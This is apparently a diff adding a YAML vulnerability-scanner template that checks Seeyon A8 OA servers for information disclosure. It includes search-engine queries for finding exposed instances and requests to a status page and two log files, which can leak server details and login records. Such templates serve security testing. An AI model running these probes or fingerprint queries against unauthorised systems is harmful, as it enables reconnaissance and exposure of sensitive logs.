@@ -1,0 +1,64 @@
+detail:
+  vulnerability:
+    level: critical
+    fofa-query: app="致远A8"
+    hunter-query: app.name="致远 A8+ OA"
+    quake-query: app:"用友致远OA协同系统-A8"
+    zoomeye-query: app:"Seeyon OA A8-m"
+    threatbook-query: title=致远A8+协同管理软件 V8.1
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-zhiyuan-A8-status.jsp-unleak
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /seeyon/management/status.jsp
+      follow_redirects: false      
+      headers:
+      body: 
+    expression: >-
+      response.status == 200 &&  response.body_string.contains("Server") && response.body_string.contains("JVM")
+      
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /seeyon/logs/login.log
+      follow_redirects: false      
+      headers:
+      body: 
+    expression: >-
+      response.status == 200  &&  response.body_string.contains("[Access URL]") 
+
+  r2:
+    request:
+      method: GET
+      cache: true
+      path: /seeyon/logs/v3x.log
+      follow_redirects: false      
+      headers:
+      body: 
+    expression: >-
+      response.status == 200 &&  response.body_string.contains("[QuartzScheduler_Worker-1]") 
+
+expression: r0() || r1() || r2()
